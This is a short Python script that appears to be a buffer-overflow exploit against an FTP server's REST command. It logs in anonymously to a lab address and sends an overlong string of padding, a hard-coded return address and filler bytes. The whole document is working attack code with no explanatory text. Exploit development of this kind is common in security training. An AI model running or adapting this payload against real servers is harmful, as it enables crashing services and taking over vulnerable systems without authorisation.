#!/usr/bin/python

import socket
import sys
evil = "A" * 247 + "\xd7\x30\x9d\x7c" + "C" * 300
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.56.103',21))
s.send('USER anonymous\r\n');
s.recv(1024)
s.send('PASS anonymous\r\n');
s.recv(1024)
s.send('REST' + evil + '\r\n');
s.recv(1024)
s.send('QUIT\r\n');
s.close

